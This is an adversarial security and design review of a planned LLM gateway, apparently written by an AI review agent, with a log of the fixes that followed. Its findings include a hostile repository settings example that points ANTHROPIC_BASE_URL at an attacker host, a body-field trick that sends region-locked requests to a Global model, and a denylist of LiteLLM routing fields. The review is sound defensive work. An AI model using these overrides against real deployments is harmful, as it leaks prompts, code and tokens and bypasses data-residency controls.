# Phase 6 gateway plan: adversarial review

Reviewer: plan-review agent, 2026-09-25. Read-only on the plan; this file is the only write.
Scope: `2026-09-25-phase-6-gateway.md` (the skeleton, 331 lines) and `2026-09-25-phase-6-gateway-parts/task-01.md` … `task-25.md` (20,481 lines), read one part at a time in line ranges.

Severity: **Critical** = an implementer following the text builds something insecure or that cannot work; **Important** = a real defect or contradiction that costs rework; **Minor** = wording, citation or sizing.

## 1. Citations checked against the real tree

| Citation | Result |
|---|---|
| `go.work:3-6` (`./control-plane`, `./sandboxd`), `go 1.23` | verified |
| `control-plane/go.mod:1` module path; `k8s.io/client-go v0.31.1` already required | verified (`go.mod:10`) |
| `control-plane/internal/httpx/problem.go:93` `WriteProblem`, `:125` `DecodeJSON` | verified |
| `control-plane/internal/backend/backend.go:168-172` Kata returns `ErrUnsupported` for `Mounts` | verified (comment at `:168-172`) |
| `control-plane/internal/api/api.go:218-264` the route table | verified (table comment `:218`, `HandleFunc` `:264`) |
| `docs/superpowers/planning/2026-09-23-owner-decisions.md:140-152` OD-19 … OD-24 | verified |
| `docs/PROGRAM.md:113-114` phase 6, `:132` never-pool, `:138` open risk 2 | verified |
| `05-design.md:193-257` §2.5 | verified; the plan follows it except where §3 says |
| Hub contract `:576-578` routes 14, 15, 16; `:614-615` null rule; `:618-619` `User` | verified, **but route 16 (`PATCH /v1/projects/{projectId}`) is role `A`, not `M`**: see I-3 |
| phase 8 plan `:141` P8-D12, `:330` precondition, `:452` Entra-only Postgres, `:464` proving dir (task 32), `:469` netpolcover | verified in `.claude/worktrees/env` at `9ef70c3` |
| phase 8 task 32 "the Kata proving checklist" (`:621`) | exists; the Secret-volume and source-address probes are **asks** into it, not yet in its text |

## 2. Skeleton findings

**I-1 (Important) Wave 6 runs task 19 beside its own dependency.** The task table gives 19 `Depends on 02, 08, 12`; the wave list puts 12 and 19 both in wave 6 (skeleton `:195`). Rule stated at `:188`: a task starts when everything it depends on is merged. Fix: move 19 to wave 7 (it then still precedes 24 in wave 8).

**I-2 (Important) The ratchet is universal; the source design keeps a solo project's choice.** `05-design.md` §2.5: *"A solo project keeps the user's choice. On a team project the route is project-wide … only an org-level compliance role may lower it."* Task 01's `CanChange` refuses every member lowering, solo or team, and task 21 passes the local user as a member, so a solo developer who pressed *Keep inference in Australia* can never go back without a compliance role that local mode does not have (ask H-4). OD-19 says only that the user can trigger AU. Either take the design's rule (`Actor` gains `Solo bool`; a solo project's owner may lower to the floor) or put the universal ratchet to the owner as a question. Today it is a silent change to the design.

**I-3 (Important) Ask H-1 asks a member to raise through an admin route.** H-1 says route 16 accepts `inferenceRoute` and enforces *"raise by any member"*; route 16's role is `A` (`hub-contract.md:578`). As written the Hub refuses a member's raise before task 01's rule runs. H-1 must ask for either a member-role inference route (`PATCH /v1/projects/{projectId}/inference`, the same shape task 21 serves locally) or a field-level role exception on route 16, and say which.

**M-1 (Minor) The skeleton contradicts task 07 on idempotency.** Pitfall row 3 (`:102`) says *"A mint is idempotent on `key_alias`, so a retry after a timeout finds the first key"*. Task 07 decision (a) does the opposite, deliberately: a retry revokes the first key and mints again, and task 07 `:1113` says nothing relies on alias uniqueness. Rewrite `:102` to task 07's rule. Likewise task 05's scope still says plain `unique (session_id, generation)`; the part correctly uses the partial index `where revoked_at is null`.

**M-2 (Minor) Attribution ids do not match the Hub's.** keysmith keys a person as `<tid>:<oid>` (task 07); the Hub's principal is `User.id` = `u-…` (`hub-contract.md:618`). The cockpit's per-person usage (task 22) and H-2's per-person budget need one mapping, owned by someone. Name it in H-2.

## 3. Security findings (parts)

**C-1 (Critical) The AU route rests on one JSON field, and the body passes LiteLLM's own routing parameters through.** The only thing that keeps an AU request on Bedrock is task 11's rewrite of `model`. Every other top-level field is relayed byte for byte, by design and by test (skeleton `:240`, *"a body with an unknown top-level field keeps it byte for byte"*). LiteLLM's proxy reads request-body control parameters of its own: client-side `fallbacks`, `context_window_fallbacks`, `mock_testing_fallbacks`, `mock_response`, `api_base`/`base_url`, `user_config` (training knowledge of LiteLLM's proxy, **UNVERIFIED** against the pinned image; whether its `/v1/messages` path honours each is also unverified). Task 18's probe list (P01–P13) asks about `metadata.tags` only. The window is real even with task 07's decision (d), which narrows an **AU-minted** key to `au/*`: a key minted while the project was Global carries every `global/*` group for up to 50 minutes after a raise (P6-D4), and a body `"fallbacks": ["global/claude-opus-4-8"]` plus a forced primary failure would leave Australia on it. Whether LiteLLM checks a fallback against the key's model list is itself unverified, which would reopen AU-minted keys too.
Fix, three parts, about 2 hours: (1) task 11 drops a named denylist of LiteLLM control fields from the body (not an allowlist, which the docs forbid), each with a test and a mutant; (2) task 18 gains P14, *"a body `fallbacks`/`mock_testing_fallbacks` on an `au/` group never reaches the `global` fake"*, a FAIL of which is an owner blocker like P06; (3) keysmith re-mints on a raise (the route source already sees it within 30 s), so no Global-minted key outlives a raise by more than one refresh.

**I-4 (Important) A repository can move `ANTHROPIC_BASE_URL`.** Task 14 puts only `apiKeyHelper` and two variables in the managed fragment and bans `ANTHROPIC_BASE_URL` from it (`task-14.md:235`); task 15 sets the base URL as launch environment. A project `.claude/settings.json` with `"env": {"ANTHROPIC_BASE_URL": "https://attacker"}` is repository content the agent does not control, and settings `env` is applied to Claude Code's own process (training knowledge, **UNVERIFIED**). The CLI would then send prompts, code and the session token there. Pod binding makes the token useless off the pod; it does nothing for the prompts. `05-design.md` §2.5 requires the product settings to *"deny project `ANTHROPIC_*` env overrides (§7.3)"*; task 14 `:474` defers the rest of that file to S6.6 without naming this item. Fix: the fragment sets `env.ANTHROPIC_BASE_URL` itself, to one name that resolves in both modes (`gatekeeper.panacea-gateway.svc.cluster.local`, a compose network alias locally), since managed settings outrank project settings; task 23 adds a check with a hostile `.claude/settings.json`.

**I-5 (Important) Budgets fail open on an unpriced model, in the cloud.** Task 18 `:11` notes that LiteLLM prices from its built-in cost table and that an unknown id leaves spend at `0`, so *"budgets can never bite"*; its fix is *"explicit local costs"* in task 02. The cloud has the same problem with more force: `claude-opus-5`, `claude-sonnet-5` and the `bedrock/au.anthropic.*` profile ids may be missing from a pinned table. Nothing in task 02, 19 or 24 checks it; task 24's P06 checks only that budgets are set. Result: all three OD-24 budgets silently off. Fix: `models.yaml` carries per-token input and output costs for both routes (marked **UNVERIFIED** prices), `gatewaygen` renders them as `model_info`, a task 02 test refuses a group without a non-zero cost, and task 09's sweep flags a key with `requests > 0` and `spend == 0`.

**I-6 (Important) Local sandboxes can reach LiteLLM directly.** Task 17 puts sandboxes, LiteLLM, keysmith, Postgres and the fakes on the one network `panacea-app-gateway`, and states the residual (`task-17.md:579`). That contradicts P6-D1 (*"compose network, task 17"*) and means task 23 cannot show the architecture's first property locally. Docker fixes it for free: a second, `internal: true` network for gatekeeper, keysmith, LiteLLM, Postgres and the fakes; sandboxes join only `panacea-app-gateway`, which holds the gatekeeper alone. Add a `compose_test.sh` rule: `litellm` and `postgres` are not on the sandbox network.

**I-7 (Important) Attribution and the team budget trust the caller's `TeamID`.** `wire.MintRequest.TeamID` is caller-asserted, `wire.ProjectInference` has no team, and task 07 `:1111` *"trusts its caller"*. The Hub's project record carries `teamId` (`hub-contract.md` §7.1, `Project`), and task 13 already reads that record. Fix: `ProjectInference` gains `TeamID`, and keysmith refuses a mint whose `TeamID` differs from the project's. P8-1 should also say that the broker checks the owner's membership of `ProjectID` in the Hub before it mints; today nothing in any plan does.

## 4. Correctness and coverage findings (parts)

**I-8 (Important) The budget probes test a key shape production never mints.** Every production key carries `user_id` **and** `team_id` (task 07 `:860`). Task 18's P03 mints `{"user_id", "models"}` only and P04 `{"team_id", "models"}` only (`task-18.md:322`, `:324`). Whether LiteLLM applies a user's `max_budget` to a key that also belongs to a team is exactly the open question (training knowledge suggests user budgets may cover personal keys only; **UNVERIFIED**). As written, P03 can PASS while the person dimension is off in production. Fix: P03 and P04 each mint the production shape (`user_id` + `team_id` + a generous key `max_budget`) and exhaust one dimension at a time. P03's stated fallback (the person dimension moves to keysmith's slice) is sound once the probe can see the failure.

**I-9 (Important) No cloud path for the cockpit's spend figures.** Task 21 reads usage from keysmith through the **local** control plane, and task 08's `kube` caller table grants `usage` to nobody (broker: mint, refresh, revoke; gatekeeper: bindings). In the cloud, the only mode the product targets for 90% of people (OD-20), keysmith has no ingress from the laptop and no caller for `usage`, so task 22's panel has nothing to show. Task 21's own gap 5 (`task-21.md:1040`) sees this; the skeleton has no seam or ask for it. Fix: add seam S6.11 (cloud usage read: keysmith pushes the rollup into the Hub, or the broker relays `GET /v1/usage` for the signed-in owner) and an ask of the Hub or phase 8 to match.

**I-10 (Important) Two parts are larger than their hours.** Task 08 is 1,659 lines and four files plus four test files (routes, TokenReview caller auth, caller table, config, fail-closed start) in 3 hours. Task 15 is 1,522 lines across three packages (`gatewayclient`, `backend` + `dockerbe`, `api` + `cmd/api`) in 3 hours. Both sit on the critical path. Split 15 into 15a (`gatewayclient`, 1.5 h) and 15b (launch wiring, 2 h); split 08's `callerauth` (TokenReview, 1.5 h) from the API and config (2 h). The total rises by about 2 hours.

**M-3 (Minor) Up to 60 s of each deleted key's spend is lost.** Task 09's sweep keeps a key's *last recorded* spend, and task 07 deletes a superseded or grace-expired key without a final read, so the team dimension undercounts every refresh and revoke by up to one sweep. Fix: `Revoke`/grace delete call `KeyInfo` once and upsert before `DeleteKeys`.

**M-4 (Minor) The grace inequality forgets the cloud's Secret propagation.** Task 14 pins helper TTL (2 min) < `Grace` (5 min), which is right locally, where the rename is seen at once. In the cloud the token arrives through a Secret volume, and kubelet refreshes those on its sync period plus cache TTL (about 1–2 min, training knowledge, **UNVERIFIED**; and **UNVERIFIED** at all inside Kata, P8-1). Write the inequality as `helper TTL + propagation < Grace` in P8-1, or raise `Grace` to 10 minutes.

**M-5 (Minor) `panacea token` waits 20 s; a retried mint takes up to about 61 s.** Task 15 retries twice on a 20 s timeout with 500 ms backoff; task 14 gives up after 20 s. The first request of a session whose first mint attempt times out fails with *"Your apiKeyHelper script is failing"* (task 14 `:8`). Either the wait covers the retry budget, or the part says the first-request failure is accepted and task 23 observes the CLI's recovery.

**M-6 (Minor) P06 proves ZDR on the success path only.** Task 12's gatekeeper canary runs through a fake LiteLLM that fails with a 500 echoing the body; task 18's P06 runs LiteLLM's canary through a succeeding call. LiteLLM's own failure logging (stdout exceptions, any error-log table) is the likelier leak. Add a P06b: the canary through a fake upstream told to answer `400` echoing the prompt, then the same `pg_dump` and stdout search.

**M-7 (Minor) Two budget clocks, one sentence.** keysmith sums a UTC calendar month (task 06, task 09); LiteLLM's person and project budgets run on `budget_duration: "30d"` from creation (task 07 `:38`, `:581`). On 1 October the cockpit can read *"US$0.00 of US$200 this month"* while LiteLLM still refuses the person on its own window, and task 22's *"can't start until 1 Oct"* is then false. Task 06 records the drift; nothing reconciles it for the reader. Either keysmith sets LiteLLM's reset to the calendar boundary (if the pinned image allows it; task 18 probe), or the panel's reset date comes from LiteLLM's `budget_reset_at` for those two dimensions.

**M-8 (Minor) Task 20's AWS provider range spans a major version** (`>= 5.70.0, < 7.0.0`, `task-20.md:178`). Phase 8's modules use a pessimistic constraint (`~> 4.81`) with the exact version in the lock file (`env/infra/scripts/guards_test.sh:50`, `:140`). Use `~>` on one major version, as phase 8 does.

## 5. Fit with the sibling plans

| Sibling | Fit | Gap |
|---|---|---|
| Hub (phase H) | H-1's JSON is task 01's `ProjectInferenceFields` exactly, with the contract's null rule; route 15 read via `FieldsFromRecord` ignores the record's other keys. Neither the ADR nor the contract mentions a data class today, so H-1 to H-4 are genuine asks | I-3 (route 16 is admin-only); I-7 (`teamId` should come from the record); I-9 (no cloud usage read) |
| Phase 8 | Namespaces, labels and peers in task 19 match the phase 8 parts (`task-13.md:210-215`, `:289-291`; `task-11.md:149-154`, verified); Entra-only Postgres is carried as P8-4; the proving list is task 32 | P8-1 needs the membership check (I-7) and the propagation inequality (M-4); P8-2 should name the AWS projected token audience `sts.amazonaws.com` on the `litellm` service account, which task 19 renders |
| Phase 7 | P7-1 is correctly an ask; the phase 7 plan has no data-class text yet | none beyond the ask |
| Phase 4 | P4-1 and S6.8 carry OD-24's "set at creation" | none |

## 6. What holds up

Tests come first in every code part, and every code part names its mutants in a table (167 mutant references across 23 parts; tasks 23 and 25 are documents). Every part has a "does not claim" section. The interfaces cross-checked between parts agree: `SpentReader.Spent` (tasks 07, 09), the `AdminAPI` subset (tasks 04, 07), `wire.NormalAddr` and `Binding.LiveAt` (tasks 03, 10), `httpx.CodeBackendUnavailable` (real, `problem.go:60`). The Panacea pitfalls each became a rule with a test: full-path `api_base` (task 02), the master key as a refused-if-empty file (tasks 04, 08, 19), own deadlines and mint-beside-start (tasks 04, 15). Task 07's supersede-on-retry with task 05's partial unique index is a better idempotency design than the skeleton's. Task 11 strips every credential-shaped header, not only `x-litellm-*`. Task 14 caught the helper-TTL-equals-grace boundary itself.

## 7. The two defects a first implementer would hit

1. **Budgets record US$0 (I-5).** The first local run prices every call at zero, because the catalogue's ids are newer than LiteLLM's built-in cost table. Task 18's P03–P05 and P12 come back UNKNOWN, task 23 item 5 cannot be shown, and the fix reopens task 02, merged in wave 1. In the cloud the same gap turns all three OD-24 budgets off with no signal.
2. **Wave 6 starts task 19 before task 12 exists (I-1).** The chart's gatekeeper Deployment, its variables and its caller-token mount come from `cmd/gatekeeper`, which is merged in the same wave. Whoever picks up task 19 finds nothing to render against.

The severest finding, C-1, is latent rather than hit: nothing fails until someone sends a crafted body.

## 8. Fix list, in order

1. C-1: body denylist in task 11, P14 in task 18, re-mint on a raise. About 2 hours.
2. I-5: costs in `models.yaml` and a `gatewaygen` test. About 1 hour.
3. I-4: `ANTHROPIC_BASE_URL` in the managed fragment, with one resolvable name. About 1 hour.
4. I-1, I-3, I-7, I-9: skeleton and ask edits. About 1 hour.
5. I-2 to the owner as a question; I-6, I-8, I-10 and the Minors in their parts.

**Plan quality: Needs fixes**

## Fix batch b01 (C-1, I-8), 2026-09-25

Line numbers are as of commit `8b8a7d7`. Parts are in `2026-09-25-phase-6-gateway-parts/`. "Skeleton" is `2026-09-25-phase-6-gateway.md`.

**C-1 (1), task 11 drops a named denylist.** Fixed as the review asks, with a wider list.
- `task-11.md:14`, decision (f): `proxy.ControlFields` holds fifteen names. They are the review's seven plus eight of the same kind: `content_policy_fallbacks`, `mock_testing_context_fallbacks`, `mock_testing_content_policy_fallbacks`, `mock_testing_rate_limit_error`, `api_key`, `api_version`, `aws_region_name`, `aws_bedrock_runtime_endpoint`. All are **UNVERIFIED** against the pinned image. A body `aws_region_name` would move a Bedrock call out of `ap-southeast-2`, which is why it is on the list.
- Matching and splicing: the match is on the decoded top-level key. Decision (a)'s splice leaves out the dropped member's byte range, separator included (`task-11.md:568`, `:660`). It is a denylist, not an allowlist.
- Tests: `TestLiteLLMControlFieldsNeverReachUpstream` (`:290`) has one row per name, from the test's own copy of the list, plus an escaped `fallbacks` row. `TestDroppingAFieldKeepsEveryOtherByte` (`:316`) covers first, middle, last and two-leading drops, byte-exact and `json.Valid`.
- Mutants: three new table rows, plus fifteen scripted **rename** mutants (`:1015`), one per name. A delete would trip the length check and prove nothing about the row.
- Restatements fixed: `task-11.md:3`, `:5`, the proxy package comment, "Does not claim" (`:1069`), gap 5 (`:1081`); skeleton `:240` (the scope line the review names, including its test list); `task-12.md:759`.

**C-1 (2), task 18 gains P14.** Fixed as the review asks.
- The probe (`task-18.md:32`, code `:357`): it sends `fallbacks` + `mock_testing_fallbacks` on `au/claude-opus-4-8` straight to LiteLLM, with two production-shaped keys. One is an AU-minted key naming `au/*` only; the other is a Global-minted key naming both groups.
- Verdicts (`v_p14`, `:236`): any request at `fakeanthropic-global` is a FAIL. A primary that reached `fakeanthropic-au` is UNKNOWN (the mock never fired), never PASS. The self-test has four new cases (31 → 35, `:562`) and a vacuity mutant.
- A FAIL is an owner blocker like P06, and exits 3 (`:551`).
- Restatements fixed: the blocker set is now P06, P13 and P14 (`task-18.md:5`, `:41`, step 9, commit body; `task-23.md:37`); skeleton `:258`; the new register row `task-25.md:125` (U20).

**C-1 (3), re-mint on a raise.** The review's wording is wrong on one fact, so the root cause is fixed another way.
- Why not keysmith: keysmith never holds a token after the mint reply (task 07 decision (f)). A key it re-minted by itself would be a key nobody holds, the one thing task 07 must not get wrong.
- keysmith retires instead: `task-07.md:41`, decision (h). `*Service` is the `wire.BindingReader` behind the gatekeeper's binding route (`ByKeyHash`, `:893`). A live Global-minted key whose project is now AU has its revocation dated `Grace` from now, and its LiteLLM key is deleted then. The bound after the first request following a raise: the route cache (≤ 30 s) plus the binding cache (≤ 10 s) plus `Grace` (5 min).
- Task 07 tests and mutants: `:555` and `:590`, five mutants (8 → 13), 14 → 16 tests.
- The refresher re-mints: `task-15.md:1159` (`sleepUnlessRaised`) and `RaiseCheck` (`:1001`), with test `:416` and two mutants. `task-08.md:1533` wires the Service in (gap `:1662`). Ask P8-1 (skeleton `:306`) makes the cloud broker do the same.
- Restatements fixed: skeleton `:68` (P6-D4), `:230` (task 07 scope; its `Models` clause also contradicted decision (d)), `:232`, `:250`.

**I-8, P03 and P04 mint the production shape.** Fixed as the review asks, and extended to P05 for the same root cause.
- `task-18.md:15`, table `:21` to `:23`, code `:302` (`prod_key`), `:306` (`budget_probe`).
- Each key carries `user_id` + `team_id` + a key `max_budget`. The dimension under test is at 1e-9 and the other two at US$1,000.
- Skeleton `:258` says the same.

**A new finding outside the review (N-1, fixed at its root).** Task 15's `refreshLoop` sent the **current** generation. Task 03's `RefreshRequest` names the **new** one (`task-03.md:447`), and task 07 refuses generation 1 as invalid, so every session's first refresh would have failed.
- It now sends `gen + 1` (`task-15.md:1133`).
- The existing refresher test asserts generation 2, and a mutant covers it (`:1558`). Recorded in task 15's gap 7 (`:1599`).

**Deferred:** none. **Owner questions:** none new. A P14 FAIL reaches the owner through task 18's step 9.


